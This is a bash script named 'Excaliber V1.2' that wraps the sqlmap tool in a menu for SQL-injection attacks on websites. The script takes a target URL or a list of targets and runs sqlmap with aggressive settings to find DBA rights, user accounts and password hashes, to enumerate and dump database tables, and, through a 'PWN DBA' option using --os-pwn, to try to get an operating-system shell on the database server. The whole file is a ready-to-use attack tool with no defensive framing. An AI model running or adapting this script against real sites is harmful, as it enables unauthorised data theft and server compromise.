#!/bin/bash

scan(){
read -p "Target URL:" target
sqlmap -u $target --random-agent --level=3 --risk=2 -o --skip-static --is-dba --privileges --roles --users --passwords --fingerprint --dbs --batch --dbms="mysql,mssql"
database
}

list(){
read -p "Path to list?:" list
sqlmap -m $list --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --batch --technique=BE --beep --dbms="mysql,mssql"
database
}

database(){
read -p "<URL:-->" target  
read -p "<DB:--->" db
sqlmap -u $target --random-agent --level=3 --risk=2 -D $db --tables --count --threads 6 --batch #--hex
read -p " What kind of tables to search?:" tables
sqlmap -u $target --random-agent -D $db -T $tables --columns --dump --threads 7
back 
}

pwn(){
read -p "URL Of DBA:" url
sqlmap -u $url --random-agent --leve=5 --risk=3 --os-pwn
back
}

back(){
read -p "Do you want to return to main menu? [y,n]:" back
if [ $back == 'y' ]
then
menu
elif [ $back == 'n' ]
then
exit
fi
}

menu(){
echo "======================================="
echo "[1] Scan Target"
echo "[2] Scan List"
echo "[3] Scan Database"
echo "[4] PWN DBA"
echo "[0] Exit" 
echo "======================================="
read -p "Choice:" choice
if [ $choice == '1' ] 
then
scan
elif [ $choice == '2' ]
then
list
elif [ $choice == '3' ]
then
database
elif [ $choice == '4' ]
then
pwn
elif [ $choice == '0' ]
then
clear
exit
fi
}
## BANNER ##
echo "=============================================================================="
echo "                /v                                                            "
echo "               /(W                                                            "
echo "              /<M-                                                            "
echo " \~b__________.$|\----------------------------------------------------------. "
echo "  >@)=======($( )#H>====================================================---------> "
echo " /_p~~~~~~~~~~.$|/----------------------------------------------------------' "
echo "              \<M-                                                            "
echo "               \(B                                                            " 
echo "                \?                                                            "
echo "                                                                              "
echo "                   Getting Injections Ready                                   "
echo "                   Codename: Excaliber V1.2                                   "
echo "=============================================================================="
echo "[1] Scan Target"
echo "[2] Scan List"
echo "[3] Scan Database"
echo "[4] PWN DBA"
echo "[0] Exit" 
echo "======================================="
read -p "Choice:" choice
if [ $choice == '1' ] 
then
scan
elif [ $choice == '2' ]
then
list
elif [ $choice == '3' ]
then
database
elif [ $choice == '4' ]
then
pwn
elif [ $choice == '0' ]
then
exit 0
fi
